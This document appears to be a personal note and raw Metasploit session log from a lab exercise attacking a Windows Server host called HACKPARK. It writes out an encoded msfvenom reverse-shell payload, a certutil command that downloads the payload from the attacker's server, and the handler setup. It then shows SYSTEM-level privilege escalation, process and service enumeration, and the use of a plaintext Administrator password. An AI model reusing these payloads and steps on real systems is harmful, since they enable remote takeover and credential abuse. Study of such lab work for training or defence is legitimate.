
go from nc shell to msf
	make msfvenom payload
		`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.21.236 LPORT=444 -f exe -o revsh-meterpr-444.exe`
	from the box - copy to box
		`certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"`
	start metasploit listener on attacker machine
		`msfconsole -q`
			`use exploit/multi/handler`
			`set payload windows/meterpreter/reverse_tcp`
			`set lhost 10.18.21.236`
			`set lport 444`
			`options` check that it's all correct
			`run` will start listening
	from the box - start revsh
		`C:\windows\temp\revsh-meterpr-444.exe`

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```


all of it
```sh
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tc
[-] The value specified for payload is not valid.
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.18.21.236
lhost => 10.18.21.236
msf6 exploit(multi/handler) > set lport 444
lport => 444
msf6 exploit(multi/handler) > options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.21.236     yes       The listen address (an interface may be specified)
   LPORT     444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.21.236:444 
[*] Sending stage (176198 bytes) to 10.10.33.96
[*] Meterpreter session 1 opened (10.18.21.236:444 -> 10.10.33.96:49421) at 2024-06-07 16:58:47 +0200

meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > multi/recon/local_exploit_suggester
[-] Unknown command: multi/recon/local_exploit_suggester. Run the help command for more details.
meterpreter > shell
Process 2736 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
    IIS APPPOOL\.NET v4.5 Classic
    IIS APPPOOL\.NET v4.5
    HACKPARK\Administrator
    HACKPARK\jeff
ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\.NET v4.5
    C:\Users\.NET v4.5 Classic
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jeff
ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
'ÉÍÍÍÍÍÍÍÍÍÍ¹' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    IIS APPPOOL\.NET v4.5 Classic

c:\windows\system32\inetsrv>    IIS APPPOOL\.NET v4.5

c:\windows\system32\inetsrv>    HACKPARK\Administrator
The system cannot find the path specified.

c:\windows\system32\inetsrv>    HACKPARK\jeff
The system cannot find the path specified.

c:\windows\system32\inetsrv>ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
'ÉÍÍÍÍÍÍÍÍÍÍ¹' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\.NET v4.5
'C:\Users\.NET' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\.NET v4.5 Classic
'C:\Users\.NET' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\Administrator
'C:\Users\Administrator' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\All Users
'C:\Users\All' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\Default
'C:\Users\Default' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\Default User
'C:\Users\Default' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>    C:\Users\jeff
'C:\Users\jeff' is not recognized as an internal or external command,
operable program or batch file.

c:\windows\system32\inetsrv>runas /user:admin cmd.exe
runas /user:admin cmd.exe
Enter the password for admin: 

c:\windows\system32\inetsrv>exit
exit
meterpreter > ps

Process List
============

 PID   PPID  Name                   Arch  Session  User              Path
 ---   ----  ----                   ----  -------  ----              ----
 0     0     [System Process]
 4     0     System
 376   4     smss.exe
 524   516   csrss.exe
 580   568   csrss.exe
 588   516   wininit.exe
 616   568   winlogon.exe
 672   588   services.exe
 680   588   lsass.exe
 740   672   svchost.exe
 784   672   svchost.exe
 812   1364  w3wp.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 864   672   svchost.exe
 880   616   dwm.exe
 904   672   svchost.exe
 960   672   svchost.exe
 1012  672   svchost.exe
 1020  672   svchost.exe
 1128  672   spoolsv.exe
 1172  672   amazon-ssm-agent.exe
 1236  672   svchost.exe
 1260  672   LiteAgent.exe
 1284  2320  WScheduler.exe
 1344  672   svchost.exe
 1364  672   svchost.exe
 1420  672   WService.exe
 1540  1420  WScheduler.exe
 1636  672   Ec2Config.exe
 1804  812   cmd.exe                x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 2016  2344  mmc.exe                x64   0        IIS APPPOOL\Blog  C:\Windows\System32\mmc.exe
 2040  672   svchost.exe
 2332  1804  conhost.exe            x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2372  672   msdtc.exe
 2516  2556  mmc.exe                x64   0        IIS APPPOOL\Blog  C:\Windows\System32\mmc.exe
 2532  904   taskhostex.exe
 2604  2596  explorer.exe
 2984  2556  ServerManager.exe
 3064  1804  revsh-meterpr-444.exe  x86   0        IIS APPPOOL\Blog  C:\windows\temp\revsh-meterpr-444.exe

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    show_mount                List all mount points/logical drives
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    clearev                   Clear the event log
    drop_token                Relinquishes any active impersonation token.
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getprivs                  Attempt to enable all privileges available to the current process
    getsid                    Get the SID of the user that the server is running as
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    reboot                    Reboots the remote computer
    reg                       Modify and interact with the remote registry
    rev2self                  Calls RevertToSelf() on the remote machine
    shell                     Drop into a system command shell
    shutdown                  Shuts down the remote computer
    steal_token               Attempts to steal an impersonation token from the target process
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                   Description
    -------                   -----------
    enumdesktops              List all accessible desktops and window stations
    getdesktop                Get the current meterpreter desktop
    idletime                  Returns the number of seconds the remote user has been idle
    keyboard_send             Send keystrokes
    keyevent                  Send key events
    keyscan_dump              Dump the keystroke buffer
    keyscan_start             Start capturing keystrokes
    keyscan_stop              Stop capturing keystrokes
    mouse                     Send mouse events
    screenshare               Watch the remote user desktop in real time
    screenshot                Grab a screenshot of the interactive desktop
    setdesktop                Change the meterpreters current desktop
    uictl                     Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    record_mic                Record audio from the default microphone for X seconds
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                   Description
    -------                   -----------
    getsystem                 Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                   Description
    -------                   -----------
    hashdump                  Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                   Description
    -------                   -----------
    timestomp                 Manipulate file MACE attributes

For more info on a specific command, use <command> -h or help <command>.

meterpreter > getdesktop
Session 0\Service-0x0-8564b$\Default
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > exit
[*] Shutting down session: 1

[*] 10.10.33.96 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.21.236:444 
[*] Sending stage (176198 bytes) to 10.10.33.96
[*] Meterpreter session 2 opened (10.18.21.236:444 -> 10.10.33.96:49479) at 2024-06-07 17:49:06 +0200

meterpreter > shell
Process 1836 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>exit
exit
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell
[-] Unknown command: powershell. Did you mean powershell_shell? Run the help command for more details.
meterpreter > powershell_shell
PS > get-service

Status   Name               DisplayName
-Stopped  AeLookupSvc        Application Experience
Stopped  ALG                Application Layer Gateway Service
Stopped  Amazon EC2Launch   Amazon EC2Launch
Running  AmazonSSMAgent     Amazon SSM Agent
Running  AppHostSvc         Application Host Helper Service
Stopped  AppIDSvc           Application Identity
Stopped  Appinfo            Application Information
Stopped  AppMgmt            Application Management
Stopped  AppReadiness       App Readiness
Stopped  AppXSvc            AppX Deployment Service (AppXSVC)
Stopped  aspnet_state       ASP.NET State Service
Stopped  AudioEndpointBu... Windows Audio Endpoint Builder
Stopped  Audiosrv           Windows Audio
Running  AWSLiteAgent       AWS Lite Guest Agent
Running  BFE                Base Filtering Engine
Stopped  BITS               Background Intelligent Transfer Ser...
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Stopped  Browser            Computer Browser
Running  CertPropSvc        Certificate Propagation
Stopped  COMSysApp          COM+ System Application
Running  CryptSvc           Cryptographic Services
Running  DcomLaunch         DCOM Server Process Launcher
Stopped  defragsvc          Optimize drives
Stopped  DeviceAssociati... Device Association Service
Stopped  DeviceInstall      Device Install Service
Running  Dhcp               DHCP Client
Running  Dnscache           DNS Client
Stopped  dot3svc            Wired AutoConfig
Running  DPS                Diagnostic Policy Service
Running  DsmSvc             Device Setup Manager
Stopped  Eaphost            Extensible Authentication Protocol
Running  Ec2Config          Ec2Config
Stopped  EFS                Encrypting File System (EFS)
Running  EventLog           Windows Event Log
Running  EventSystem        COM+ Event System
Stopped  fdPHost            Function Discovery Provider Host
Stopped  FDResPub           Function Discovery Resource Publica...
Running  FontCache          Windows Font Cache Service
Running  gpsvc              Group Policy Client
Stopped  hidserv            Human Interface Device Service
Stopped  hkmsvc             Health Key and Certificate Management
Stopped  IEEtwCollectorS... Internet Explorer ETW Collector Ser...
Stopped  IKEEXT             IKE and AuthIP IPsec Keying Modules
Running  iphlpsvc           IP Helper
Stopped  KeyIso             CNG Key Isolation
Stopped  KPSSVC             KDC Proxy Server service (KPS)
Stopped  KtmRm              KtmRm for Distributed Transaction C...
Running  LanmanServer       Server
Running  LanmanWorkstation  Workstation
Stopped  lltdsvc            Link-Layer Topology Discovery Mapper
Running  lmhosts            TCP/IP NetBIOS Helper
Running  LSM                Local Session Manager
Stopped  MMCSS              Multimedia Class Scheduler
Running  MpsSvc             Windows Firewall
Running  MSDTC              Distributed Transaction Coordinator
Stopped  MSiSCSI            Microsoft iSCSI Initiator Service
Stopped  msiserver          Windows Installer
Stopped  napagent           Network Access Protection Agent
Stopped  NcaSvc             Network Connectivity Assistant
Stopped  Netlogon           Netlogon
Stopped  Netman             Network Connections
Running  netprofm           Network List Service
Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service
Running  NlaSvc             Network Location Awareness
Running  nsi                Network Store Interface Service
Stopped  PerfHost           Performance Counter DLL Host
Stopped  pla                Performance Logs & Alerts
Running  PlugPlay           Plug and Play
Stopped  PolicyAgent        IPsec Policy Agent
Running  Power              Power
Stopped  PrintNotify        Printer Extensions and Notifications
Running  ProfSvc            User Profile Service
Stopped  PsShutdownSvc      PsShutdown
Stopped  RasAuto            Remote Access Auto Connection Manager
Stopped  RasMan             Remote Access Connection Manager
Stopped  RemoteAccess       Routing and Remote Access
Stopped  RemoteRegistry     Remote Registry
Running  RpcEptMapper       RPC Endpoint Mapper
Stopped  RpcLocator         Remote Procedure Call (RPC) Locator
Running  RpcSs              Remote Procedure Call (RPC)
Stopped  RSoPProv           Resultant Set of Policy Provider
Stopped  sacsvr             Special Administration Console Helper
Running  SamSs              Security Accounts Manager
Stopped  SCardSvr           Smart Card
Stopped  ScDeviceEnum       Smart Card Device Enumeration Service
Running  Schedule           Task Scheduler
Stopped  SCPolicySvc        Smart Card Removal Policy
Running  seclogon           Secondary Logon
Running  SENS               System Event Notification Service
Running  SessionEnv         Remote Desktop Configuration
Stopped  SharedAccess       Internet Connection Sharing (ICS)
Running  ShellHWDetection   Shell Hardware Detection
Stopped  smphost            Microsoft Storage Spaces SMP
Stopped  SNMPTRAP           SNMP Trap
Running  Spooler            Print Spooler
Stopped  sppsvc             Software Protection
Stopped  SstpSvc            Secure Socket Tunneling Protocol Se...
Stopped  svsvc              Spot Verifier
Stopped  swprv              Microsoft Software Shadow Copy Prov...
Stopped  SysMain            Superfetch
Running  SystemEventsBroker System Events Broker
Stopped  TapiSrv            Telephony
Running  TermService        Remote Desktop Services
Running  Themes             Themes
Stopped  THREADORDER        Thread Ordering Server
Stopped  TieringEngineSe... Storage Tiers Management
Running  TrkWks             Distributed Link Tracking Client
Stopped  TrustedInstaller   Windows Modules Installer
Running  UALSVC             User Access Logging Service
Stopped  UI0Detect          Interactive Services Detection
Running  UmRdpService       Remote Desktop Services UserMode Po...
Running  VaultSvc           Credential Manager
Stopped  vds                Virtual Disk
Stopped  vmicguestinterface Hyper-V Guest Service Interface
Stopped  vmicheartbeat      Hyper-V Heartbeat Service
Stopped  vmickvpexchange    Hyper-V Data Exchange Service
Stopped  vmicrdv            Hyper-V Remote Desktop Virtualizati...
Stopped  vmicshutdown       Hyper-V Guest Shutdown Service
Stopped  vmictimesync       Hyper-V Time Synchronization Service
Stopped  vmicvss            Hyper-V Volume Shadow Copy Requestor
Stopped  VSS                Volume Shadow Copy
Running  W32Time            Windows Time
Stopped  w3logsvc           W3C Logging Service
Running  W3SVC              World Wide Web Publishing Service
Running  WAS                Windows Process Activation Service
Running  Wcmsvc             Windows Connection Manager
Stopped  WcsPlugInService   Windows Color System
Stopped  WdiServiceHost     Diagnostic Service Host
Stopped  WdiSystemHost      Diagnostic System Host
Stopped  Wecsvc             Windows Event Collector
Stopped  WEPHOSTSVC         Windows Encryption Provider Host Se...
Stopped  wercplsupport      Problem Reports and Solutions Contr...
Stopped  WerSvc             Windows Error Reporting Service
Running  WindowsScheduler   System Scheduler Service
Stopped  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation
Running  WinRM              Windows Remote Management (WS-Manag...
Stopped  wmiApSrv           WMI Performance Adapter
Stopped  WPDBusEnum         Portable Device Enumerator Service
Stopped  WSService          Windows Store Service (WSService)
Stopped  wuauserv           Windows Update
Stopped  wudfsvc            Windows Driver Foundation - User-mo...


PS > exit
PS > exit
PS > exit
PS > exit
PS > ^C
Terminate channel 2? [y/N]  y
meterpreter > sessions
Usage: sessions [options] or sessions [id]

Interact with a different session ID.

OPTIONS:

    -h, --help           Show this message
    -i, --interact <id>  Interact with a provided session ID

meterpreter > help

Core Commands
=============

    Command                    Description
    -------                    -----------
    ?                          Help menu
    background                 Backgrounds the current session
    bg                         Alias for background
    bgkill                     Kills a background meterpreter script
    bglist                     Lists running background scripts
    bgrun                      Executes a meterpreter script as a background thread
    channel                    Displays information or control active channels
    close                      Closes a channel
    detach                     Detach the meterpreter session (for http/https)
    disable_unicode_encoding   Disables encoding of unicode strings
    enable_unicode_encoding    Enables encoding of unicode strings
    exit                       Terminate the meterpreter session
    get_timeouts               Get the current session timeout values
    guid                       Get the session GUID
    help                       Help menu
    info                       Displays information about a Post module
    irb                        Open an interactive Ruby shell on the current session
    load                       Load one or more meterpreter extensions
    machine_id                 Get the MSF ID of the machine attached to the session
    migrate                    Migrate the server to another process
    pivot                      Manage pivot listeners
    pry                        Open the Pry debugger on the current session
    quit                       Terminate the meterpreter session
    read                       Reads data from a channel
    resource                   Run the commands stored in a file
    run                        Executes a meterpreter script or Post module
    secure                     (Re)Negotiate TLV packet encryption on the session
    sessions                   Quickly switch to another session
    set_timeouts               Set the current session timeout values
    sleep                      Force Meterpreter to go quiet, then re-establish session
    ssl_verify                 Modify the SSL certificate verification setting
    transport                  Manage the transport mechanisms
    use                        Deprecated alias for "load"
    uuid                       Get the UUID for the current session
    write                      Writes data to a channel


Stdapi: File system Commands
============================

    Command                    Description
    -------                    -----------
    cat                        Read the contents of a file to the screen
    cd                         Change directory
    checksum                   Retrieve the checksum of a file
    cp                         Copy source to destination
    del                        Delete the specified file
    dir                        List files (alias for ls)
    download                   Download a file or directory
    edit                       Edit a file
    getlwd                     Print local working directory (alias for lpwd)
    getwd                      Print working directory
    lcat                       Read the contents of a local file to the screen
    lcd                        Change local working directory
    ldir                       List local files (alias for lls)
    lls                        List local files
    lmkdir                     Create new directory on local machine
    lpwd                       Print local working directory
    ls                         List files
    mkdir                      Make directory
    mv                         Move source to destination
    pwd                        Print working directory
    rm                         Delete the specified file
    rmdir                      Remove directory
    search                     Search for files
    show_mount                 List all mount points/logical drives
    upload                     Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                    Description
    -------                    -----------
    arp                        Display the host ARP cache
    getproxy                   Display the current proxy configuration
    ifconfig                   Display interfaces
    ipconfig                   Display interfaces
    netstat                    Display the network connections
    portfwd                    Forward a local port to a remote service
    resolve                    Resolve a set of host names on the target
    route                      View and modify the routing table


Stdapi: System Commands
=======================

    Command                    Description
    -------                    -----------
    clearev                    Clear the event log
    drop_token                 Relinquishes any active impersonation token.
    execute                    Execute a command
    getenv                     Get one or more environment variable values
    getpid                     Get the current process identifier
    getprivs                   Attempt to enable all privileges available to the current process
    getsid                     Get the SID of the user that the server is running as
    getuid                     Get the user that the server is running as
    kill                       Terminate a process
    localtime                  Displays the target system local date and time
    pgrep                      Filter processes by name
    pkill                      Terminate processes by name
    ps                         List running processes
    reboot                     Reboots the remote computer
    reg                        Modify and interact with the remote registry
    rev2self                   Calls RevertToSelf() on the remote machine
    shell                      Drop into a system command shell
    shutdown                   Shuts down the remote computer
    steal_token                Attempts to steal an impersonation token from the target process
    suspend                    Suspends or resumes a list of processes
    sysinfo                    Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command                    Description
    -------                    -----------
    enumdesktops               List all accessible desktops and window stations
    getdesktop                 Get the current meterpreter desktop
    idletime                   Returns the number of seconds the remote user has been idle
    keyboard_send              Send keystrokes
    keyevent                   Send key events
    keyscan_dump               Dump the keystroke buffer
    keyscan_start              Start capturing keystrokes
    keyscan_stop               Stop capturing keystrokes
    mouse                      Send mouse events
    screenshare                Watch the remote user desktop in real time
    screenshot                 Grab a screenshot of the interactive desktop
    setdesktop                 Change the meterpreters current desktop
    uictl                      Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command                    Description
    -------                    -----------
    record_mic                 Record audio from the default microphone for X seconds
    webcam_chat                Start a video chat
    webcam_list                List webcams
    webcam_snap                Take a snapshot from the specified webcam
    webcam_stream              Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command                    Description
    -------                    -----------
    play                       play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command                    Description
    -------                    -----------
    getsystem                  Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command                    Description
    -------                    -----------
    hashdump                   Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command                    Description
    -------                    -----------
    timestomp                  Manipulate file MACE attributes


Powershell Commands
===================

    Command                    Description
    -------                    -----------
    powershell_execute         Execute a Powershell command string
    powershell_import          Import a PS1 script or .NET Assembly DLL
    powershell_session_remove  Remove/clear a session (other than default)
    powershell_shell           Create an interactive Powershell prompt

For more info on a specific command, use <command> -h or help <command>.

meterpreter > powershell_shell
PS > Get-ScheduledTask | Where-Object {$_.State -eq 'Running'}

TaskPath                                       TaskName                          State
-\Microsoft\Windows\TextServicesFramework\      MsCtfMonitor                      Running
\Microsoft\Windows\Wininet\                    CacheTask                         Running


PS > cmdkey

Creates, displays, and deletes stored user names and passwords.

The syntax of this command is:

CMDKEY [{/add | /generic}:targetname {/smartcard | /user:username {/pass{:password}}} | /delete{:targetname | /ras} | /
list{:targetname}]

Examples:

  To list available credentials:
     cmdkey /list
     cmdkey /list:targetname

  To create domain credentials:
     cmdkey /add:targetname /user:username /pass:password
     cmdkey /add:targetname /user:username /pass
     cmdkey /add:targetname /user:username
     cmdkey /add:targetname /smartcard

  To create generic credentials:
     The /add switch may be replaced by /generic to create generic credentials

  To delete existing credentials:
     cmdkey /delete:targetname

  To delete RAS credentials:
     cmdkey /delete /ras

PS > cmdkey /add:localhost /user:Administrator /pass:4q6XvFES7Fdxs

CMDKEY: Credential added successfully.
PS > runas /user:localhost/Administrator "cmd.exe"
 


[*] 10.10.33.96 - Meterpreter session 2 closed.  Reason: Died


Terminate channel 3? [y/N]  y
[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>
msf6 exploit(multi/handler) > sessions

Active sessions
===============

No active sessions.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.21.236:444 
[*] Sending stage (176198 bytes) to 10.10.33.96
[*] Meterpreter session 3 opened (10.18.21.236:444 -> 10.10.33.96:49583) at 2024-06-07 19:25:52 +0200

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > cd C:\PROGRA~2\SYSTEM~1\
PS > dir


    Directory: C:\Program Files (x86)\SystemScheduler


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----          6/7/2024  10:27 AM            Events
-a---         5/17/2007   1:47 PM       1150 alarmclock.ico
-a---         8/31/2003  12:06 PM        766 clock.ico
-a---         8/31/2003  12:06 PM      80856 ding.wav
-a---          8/4/2019   4:36 AM         60 Forum.url
-a---          1/8/2009   7:21 PM    1637972 libeay32.dll
-a---        11/15/2004  11:16 PM       9813 License.txt
-a---          6/7/2024   4:42 AM       1496 LogFile.txt
-a---          6/7/2024   4:43 AM       3760 LogfileAdvanced.txt
-a---         3/25/2018  10:58 AM     536992 Message.exe
-a---         3/25/2018  10:59 AM     445344 PlaySound.exe
-a---         3/25/2018  10:58 AM      27040 PlayWAV.exe
-a---          8/4/2019   3:05 PM        149 Preferences.ini
-a---         3/25/2018  10:58 AM     485792 Privilege.exe
-a---         3/24/2018  12:09 PM      10100 ReadMe.txt
-a---         3/25/2018  10:58 AM     112544 RunNow.exe
-a---         3/25/2018  10:59 AM      40352 sc32.exe
-a---         8/31/2003  12:06 PM        766 schedule.ico
-a---         3/25/2018  10:58 AM    1633696 Scheduler.exe
-a---         3/25/2018  10:59 AM     491936 SendKeysHelper.exe
-a---         3/25/2018  10:58 AM     437664 ShowXY.exe
-a---         3/25/2018  10:58 AM     439712 ShutdownGUI.exe
-a---         3/25/2018  10:58 AM     235936 SSAdmin.exe
-a---         3/25/2018  10:58 AM     731552 SSCmd.exe
-a---          1/8/2009   7:12 PM     355446 ssleay32.dll
-a---         3/25/2018  10:58 AM     456608 SSMail.exe
-a---          8/4/2019   4:36 AM       6999 unins000.dat
-a---          8/4/2019   4:36 AM     722597 unins000.exe
-a---          8/4/2019   4:36 AM         54 Website.url
-a---         6/26/2009   5:27 PM       6574 whiteclock.ico
-a---         3/25/2018  10:58 AM      76704 WhoAmI.exe
-a---         5/16/2006   4:49 PM     785042 WSCHEDULER.CHM
-a---         5/16/2006   3:58 PM       2026 WScheduler.cnt
-a---         3/25/2018  10:58 AM     331168 WScheduler.exe
-a---         5/16/2006   4:58 PM     703081 WSCHEDULER.HLP
-a---         3/25/2018  10:58 AM     136096 WSCtrl.exe
-a---         3/25/2018  10:58 AM      98720 WService.exe
-a---         3/25/2018  10:58 AM      68512 WSLogon.exe
-a---         3/25/2018  10:59 AM      33184 WSProc.dll


PS > type logfile.txt
08/04/19 04:37:02,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 11:47:18,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 15:03:47,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 16:42:54,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 16:47:29,Stopping System Scheduler SERVICE. (SYSTEM)
08/04/19 16:47:37,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 17:59:37,Starting System Scheduler SERVICE (SYSTEM)
08/04/19 18:04:10,Stopping System Scheduler SERVICE. (SYSTEM)
EM)
08/05/19 14:03:43,Starting System Scheduler SERVICE (SYSTEM)
08/06/19 14:11:27,Starting System Scheduler SERVICE (SYSTEM)
08/06/19 14:16:26,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:12:16,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 14:30:29,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:31:29,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 14:48:55,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 14:50:01,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:03:23,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 15:04:22,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:05:49,Stopping System Scheduler SERVICE. (SYSTEM)
10/02/20 15:06:49,Starting System Scheduler SERVICE (SYSTEM)
10/02/20 15:10:59,Stopping System Scheduler SERVICE. (SYSTEM)
06/07/24 04:42:34,Starting System Scheduler SERVICE (SYSTEM)
PS > type logfileadvanced.txt
08/04/19 04:36:53,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 04:36:53,AD1=1 AD2=1 (:)
08/04/19 04:36:53,Preferences Loading (Administrator:1)
08/04/19 04:37:02,Preferences Loading (SYSTEM_svc:0)*
08/04/19 11:47:18,Preferences Loading (SYSTEM_svc:0)*
08/04/19 11:48:09,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 11:48:09,AD1=1 AD2=1 (:)
08/04/19 11:48:09,Preferences Loading (Administrator:1)
08/04/19 11:55:05,ElevationType1:1 Elevation2:0 ***IntegrityLevel3:8192 (:)
08/04/19 11:55:05,AD1=0 AD2=0 (:)
08/04/19 11:55:05,Preferences Loading (jeff:2)
08/04/19 11:57:56,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 11:57:56,AD1=1 AD2=1 (:)
08/04/19 11:57:56,Preferences Loading (Administrator:1)
08/04/19 15:03:47,Preferences Loading (SYSTEM_svc:0)*
08/04/19 15:04:19,ElevationType1:1 Elevation2:1 ***IntegrityLevel3:12288 (:)
08/04/19 15:04:19,AD1=1 AD2=1 (:)
08/04/19 15:04:19,Preferences Loading (Administrator:1)
